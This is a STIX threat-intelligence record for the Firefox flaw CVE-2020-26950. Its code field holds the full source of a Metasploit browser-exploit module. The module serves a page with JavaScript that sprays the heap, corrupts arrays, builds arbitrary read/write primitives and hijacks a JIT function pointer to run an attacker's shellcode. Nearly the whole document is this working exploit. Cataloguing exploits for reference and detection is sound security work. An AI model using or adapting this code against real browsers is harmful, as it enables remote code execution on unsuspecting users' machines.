{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--741abefc-8942-49c8-afee-85d22bc7c709",
    "created": "2024-08-14T17:06:01.543777Z",
    "modified": "2024-08-14T17:06:01.543781Z",
    "name": "Firefox MCallGetProperty Write Side Effects Use After Free Exploit",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/firefox_jit_use_after_free.rb",
            "external_id": "firefox_jit_use_after_free.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-26950"
        },
        {
            "source_name": "reference",
            "url": "https://www.mozilla.org/en-US/security/advisories/mfsa2020-49/#CVE-2020-26950"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1675905"
        },
        {
            "source_name": "reference",
            "url": "https://www.sentinelone.com/labs/firefox-jit-use-after-frees-exploiting-cve-2020-26950/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpServer::BrowserExploit\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Firefox MCallGetProperty Write Side Effects Use After Free Exploit',\n        'Description' => %q{\n          This modules exploits CVE-2020-26950, a use after free exploit in Firefox.\n          The MCallGetProperty opcode can be emitted with unmet assumptions resulting\n          in an exploitable use-after-free condition.\n\n          This exploit uses a somewhat novel technique of spraying ArgumentsData\n          structures in order to construct primitives. The shellcode is forced into\n          executable memory via the JIT compiler, and executed by writing to the JIT\n          region pointer.\n\n          This exploit does not contain a sandbox escape, so firefox must be run\n          with the MOZ_DISABLE_CONTENT_SANDBOX environment variable set, in order\n          for the shellcode to run successfully.\n\n          This vulnerability affects Firefox < 82.0.3, Firefox ESR < 78.4.1, and\n          Thunderbird < 78.4.2, however only Firefox <= 79 is supported as a target.\n          Additional work may be needed to support other versions such as Firefox 82.0.1.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          '360 ESG Vulnerability Research Institute', # discovery\n          'maxpl0it', # writeup and exploit\n          'timwr', # metasploit module\n        ],\n        'References' => [\n          ['CVE', '2020-26950'],\n          ['URL', 'https://www.mozilla.org/en-US/security/advisories/mfsa2020-49/#CVE-2020-26950'],\n          ['URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=1675905'],\n          ['URL', 'https://www.sentinelone.com/labs/firefox-jit-use-after-frees-exploiting-cve-2020-26950/'],\n        ],\n        'Arch' => [ ARCH_X64 ],\n        'Platform' => ['linux', 'windows'],\n        'DefaultTarget' => 0,\n        'Targets' => [\n          [ 'Automatic', {}],\n        ],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS ],\n          'Stability' => [CRASH_SAFE]\n        },\n        'DisclosureDate' => '2020-11-18'\n      )\n    )\n  end\n\n  def create_js_shellcode\n    shellcode = \"AAAA\\x00\\x00\\x00\\x00\" + \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" + payload.encoded\n    if (shellcode.length % 8 > 0)\n      shellcode += \"\\x00\" * (8 - shellcode.length % 8)\n    end\n    shellcode_js = ''\n    for chunk in 0..(shellcode.length / 8) - 1\n      label = (0x41 + chunk / 26).chr + (0x41 + chunk % 26).chr\n      shellcode_chunk = shellcode[chunk * 8..(chunk + 1) * 8]\n      shellcode_js += label + ' = ' + shellcode_chunk.unpack('E').first.to_s + \"\\n\"\n    end\n    shellcode_js\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Sending #{request.uri} to #{request['User-Agent']}\")\n    shellcode_js = create_js_shellcode\n    jscript = <<~JS\n      // Triggers the vulnerability\n      function jitme(cons, interesting, i) {\n         interesting.x1 = 10; // Make sure the MSlots is saved\n\n         new cons(); // Trigger the vulnerability - Reallocates the object slots\n\n         // Allocate a large array on top of this previous slots location.\n         let target = [0,1,2,3,4,5,6,7,8,9,10,11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489]; // Goes on to 489 to be close to the number of properties \u2018cons\u2019 has\n\n         // Avoid Elements Copy-On-Write by pushing a value\n         target.push(i);\n\n         // Write the Initialized Length, Capacity, and Length to be larger than it is\n         // This will work when interesting == cons\n         interesting.x1 = 3.476677904727e-310;\n         interesting.x0 = 3.4766779039175e-310;\n\n         // Return the corrupted array\n         return target;\n      }\n\n      // Initialises vulnerable objects\n      function init() {\n         // arr will contain our sprayed objects\n         var arr = [];\n\n         // We'll create one object...\n         var cons = function() {};\n         for(j=0; j<512; j++) cons['x'+j] = j; // Add 512 properties (Large jemalloc allocation)\n         arr.push(cons);\n\n         // ...then duplicate it a whole bunch of times\n         // The number of times has two uses:\n         //    - Heap spray - Stops any already freed objects getting in our way\n         //    - Allows us to get the jitme function compiled\n         for (var i = 0; i < 20000; i++) arr.push(Object.assign(function(){}, cons));\n\n         // Return the array\n         return arr;\n      }\n\n      // Global that holds the total number of objects in our original spray array\n      TOTAL = 0;\n\n      // Global that holds the target argument so it can be used later\n      arg = 0;\n\n      evil = 0;\n\n      //   setup_prim - Performs recursion to get the vulnerable arguments object\n      //       arguments[0] - Original spray array\n      //       arguments[1] - Recursive depth counter\n      //       arguments[2]+ - Numbers to pad to the right reallocation size\n      function setup_prim() {\n         // Base case of our recursion\n         // If we have reached the end of the original spray array...\n         if(arguments[1] == TOTAL) {\n\n             // Delete an argument to generate the RareArgumentsData pointer\n             delete arguments[3];\n\n             // Read out of bounds to the next object (sprayed objects)\n             // Check whether the RareArgumentsData pointer is null\n             if(evil[511] != 0) return arguments;\n\n             // If it was null, then we return and try the next one\n             return 0;\n         }\n\n         // Get the cons value\n         let cons = arguments[0][arguments[1]];\n\n         // Move the pointer (could just do cons.p481 = 481, but this is more fun)\n         new cons();\n\n         // Recursive call\n         res = setup_prim(arguments[0], arguments[1]+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480 );\n\n         // If the returned value is non-zero, then we found our target ArgumentsData object, so keep returning it\n         if(res != 0) return res;\n\n         // Otherwise, repeat the base case (delete an argument)\n         delete arguments[3];\n\n         // Check if the next object has a null RareArgumentsData pointer\n         if(evil[511] != 0) return arguments; // Return arguments if not\n\n         // Otherwise just return 0 and try the next one\n         return 0;\n      }\n\n      // weak_read32 - Bit-by-bit read\n      function weak_read32(arg, addr) {\n         // Set the RareArgumentsData pointer to the address\n         evil[511] = addr;\n\n         // Used to hold the leaked data\n         let val = 0;\n\n         // Read it bit-by-bit for 32 bits\n         // Endianness is taken into account\n         for(let i = 32; i >= 0; i--) {\n             val = val << 1; // Shift\n             if(arg[i] == undefined) {\n                 val = val | 1;\n             }\n         }\n\n         // Return the integer\n         return val;\n      }\n\n      // weak_read64 - Bit-by-bit read using BigUint64Array\n      function weak_read64(arg, addr) {\n         // Set the RareArgumentsData pointer to the address\n         evil[511] = addr;\n\n         // Used to hold the leaked data\n         val = new BigUint64Array(1);\n         val[0] = 0n;\n\n         // Read it bit-by-bit for 64 bits\n         for(let i = 64; i >= 0; i--) {\n             val[0] = val[0] << 1n;\n             if(arg[i] == undefined) {\n                 val[0] = val[0] | 1n;\n             }\n         }\n\n         // Return the BigInt\n         return val[0];\n      }\n\n      // write_nan - Uses the bit-setting capability of the bitmap to create the NaN-Box\n      function write_nan(arg, addr) {\n         evil[511] = addr;\n         for(let i = 64 - 15; i < 64; i++) delete arg[i]; // Delete bits 49-64 to create 0xfffe pointer box\n      }\n\n      // write - Write a value to an address\n      function write(address, value) {\n         // Set the fake ArrayBuffer backing store address\n         address = dbl_to_bigint(address)\n         target_uint32arr[14] = parseInt(address) & 0xffffffff\n         target_uint32arr[15] = parseInt(address >> 32n);\n\n         // Use the fake ArrayBuffer backing store to write a value to a location\n         value = dbl_to_bigint(value);\n         fake_arrbuf[1] = parseInt(value >> 32n);\n         fake_arrbuf[0] = parseInt(value & 0xffffffffn);\n      }\n\n      // addrof - Gets the address of a given object\n      function addrof(arg, o) {\n         // Set the 5th property of the arguments object\n         arg[5] = o;\n\n         // Get the address of the 5th property\n         target = ad_location + (7n * 8n) // [len][deleted][0][1][2][3][4][5] (index 7)\n\n         // Set the fake ArrayBuffer backing store to point to this location\n         target_uint32arr[14] = parseInt(target) & 0xffffffff;\n         target_uint32arr[15] = parseInt(target >> 32n);\n\n         // Read the address of the object o\n         return (BigInt(fake_arrbuf[1] & 0xffff) << 32n) + BigInt(fake_arrbuf[0]);\n      }\n\n      // shellcode - Constant values which hold our shellcode to pop xcalc.\n      function shellcode(){\n      #{shellcode_js}\n      }\n\n      // helper functions\n      var conv_buf = new ArrayBuffer(8);\n      var f64_buf = new Float64Array(conv_buf);\n      var u64_buf = new Uint32Array(conv_buf);\n\n      function dbl_to_bigint(val) {\n          f64_buf[0] = val;\n          return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);\n      }\n\n      function bigint_to_dbl(val) {\n          u64_buf[0] = Number(val & 0xffffffffn);\n          u64_buf[1] = Number(val >> 32n);\n          return f64_buf[0];\n      }\n\n      function main() {\n         let i = 0;\n         // ensure the shellcode is in jit rwx memory\n         for(i = 0;i < 0x5000; i++) shellcode();\n\n         // The jitme function returns arrays. We'll save them, just in case.\n         let arr_saved = [];\n\n         // Get the sprayed objects\n         let arr = init();\n\n         // This is our target object. Choosing one of the end ones so that there is enough time for jitme to be compiled\n         let interesting = arr[arr.length - 10];\n\n         // Iterate over the vulnerable object array\n         for (i = 0; i < arr.length; i++) {\n             // Run the jitme function across the array\n             corr_arr = jitme(arr[i], interesting, i);\n\n             // Save the generated array. Never trust the garbage collector.\n             arr_saved[i] = corr_arr;\n\n             // Find the corrupted array\n             if(corr_arr.length != 491) {\n                 // Save it for future evil\n                 evil = corr_arr\n                 break;\n             }\n         }\n\n         if(evil == 0) {\n             print(\"Failure: Failed to get the corrupted array\");\n             return;\n         }\n         print(\"got the corrupted array \" + evil.length);\n\n         TOTAL=arr.length;\n         arg = setup_prim(arr, i+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480);\n\n         old_rareargdat_ptr = evil[511];\n         print(\"Leaked nursery location: \" + dbl_to_bigint(old_rareargdat_ptr).toString(16));\n\n         iterator = dbl_to_bigint(old_rareargdat_ptr); // Start from this value\n         counter = 0; // Used to prevent a while(true) situation\n         while(counter < 0x200) {\n             // Read the current address\n            output = weak_read32(arg, bigint_to_dbl(iterator));\n\n            // Check if it's the expected size value for our ArgumentsObject object\n            if(output == 0x1e10 || output == 0x1e20) {\n                // If it is, then read the ArgumentsData pointer\n                ad_location = weak_read64(arg, bigint_to_dbl(iterator + 8n));\n\n                // Get the pointer in ArgumentsData to RareArgumentsData\n                ptr_in_argdat = weak_read64(arg, bigint_to_dbl(ad_location + 8n));\n\n                // ad_location + 8 points to the RareArgumentsData pointer, so this should match\n                // We do this because after spraying arguments, there may be a few ArgumentObjects to go past\n                if((ad_location + 8n) == ptr_in_argdat) break;\n            }\n            // Iterate backwards\n            iterator = iterator - 8n;\n\n             // Increment counter\n            counter += 1;\n         }\n\n         if(counter == 0x200) {\n             print(\"Failure: Failed to get AD location\");\n             return;\n         }\n\n         print(\"AD location: \" + ad_location.toString(16));\n\n         // The target Uint32Array - A large size value to:\n         //   - Help find the object (Not many 0x00101337 values nearby!)\n         //   - Give enough space for 0xfffff so we can fake a Nursery Cell ((ptr & 0xfffffffffff00000) | 0xfffe8 must be set to 1 to avoid crashes)\n         target_uint32arr = new Uint32Array(0x101337);\n\n         // Find the Uint32Array starting from the original leaked Nursery pointer\n         iterator = dbl_to_bigint(old_rareargdat_ptr);\n         counter = 0; // Use a counter\n         while(counter < 0x5000) {\n\n             // Read a memory address\n             output = weak_read32(arg, bigint_to_dbl(iterator));\n\n             // If we have found the right size value, we have found the Uint32Array!\n             if(output == 0x101337) break;\n\n             // Check the next memory location\n             iterator = iterator + 8n;\n\n             // Increment the counter\n             counter += 1;\n         }\n\n         if(counter == 0x5000) {\n             print(\"Failure: Failed to find the Uint32Array\");\n             return;\n         }\n\n         // Subtract from the size value address to get to the start of the Uint32Array\n         arr_buf_addr = iterator - 40n;\n\n         // Get the Array Buffer backing store\n         arr_buf_loc = weak_read64(arg, bigint_to_dbl(iterator  + 16n));\n         print(\"AB Location: \" + arr_buf_loc.toString(16));\n\n         // Create a fake ArrayBuffer through cloning\n         iterator = arr_buf_addr;\n         for(i=0;i<64;i++) {\n             output = weak_read32(arg, bigint_to_dbl(iterator));\n             target_uint32arr[i] = output;\n             iterator = iterator + 4n;\n         }\n\n         // Cell Header - Set it to Nursery to pass isNursery()\n         target_uint32arr[0x3fffa] = 1;\n\n         // Write an unboxed pointer to arguments[0]\n         evil[512] = bigint_to_dbl(arr_buf_loc);\n\n         // Make it NaN-Boxed\n         write_nan(arg, bigint_to_dbl(ad_location + 16n)); // Points to evil[512]/arguments[0]\n\n         // From here we have a fake UintArray in arg[0]\n         // Pointer can be changed using target_uint32arr[14] and target_uint32arr[15]\n         fake_arrbuf = arg[0];\n\n         // Get the address of the shellcode function object\n         shellcode_addr = addrof(arg, shellcode);\n         print(\"Function is at: \" + shellcode_addr.toString(16));\n\n         // Get the jitInfo pointer in the JSFunction object\n         jitinfo = weak_read64(arg, bigint_to_dbl(shellcode_addr + 0x30n)); // JSFunction.u.native.extra.jitInfo_\n         print(\"  jitinfo: \" + jitinfo.toString(16));\n\n         // We can then fetch the RX region from  here\n         rx_region = weak_read64(arg, bigint_to_dbl(jitinfo));\n         print(\"  RX Region: \" + rx_region.toString(16));\n\n         iterator = rx_region; // Start from the RX region\n         found = false\n         // Iterate to find the 0x41414141 value in-memory. 8 bytes after this is the start of the shellcode.\n         for(i = 0; i < 0x800; i++) {\n             data = weak_read64(arg, bigint_to_dbl(iterator));\n             if(data == 0x41414141n) {\n                 iterator = iterator + 8n;\n                 found = true;\n                 break;\n             }\n             iterator = iterator + 8n;\n         }\n         if(!found) {\n             print(\"Failure: Failed to find the JIT start\");\n             return;\n         }\n\n         // We now have a pointer to the start of the shellcode\n         shellcode_location = iterator;\n         print(\"Shellcode start: \" + shellcode_location.toString(16));\n\n         // And can now overwrite the previous jitInfo pointer with our shellcode pointer\n         write(bigint_to_dbl(jitinfo), bigint_to_dbl(shellcode_location));\n\n         print(\"Triggering...\");\n         shellcode(); // Triggering our shellcode is as simple as calling the function again.\n      }\n      main();\n    JS\n\n    jscript = add_debug_print_js(jscript)\n    html = %(\n<html>\n<script>\n#{jscript}\n</script>\n</html>\n)\n    send_response(cli, html, {\n      'Content-Type' => 'text/html',\n      'Cache-Control' => 'no-cache, no-store, must-revalidate',\n      'Pragma' => 'no-cache', 'Expires' => '0'\n    })\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-11-18",
    "x_mitre_platforms": [
        "['linux', 'windows']"
    ]
}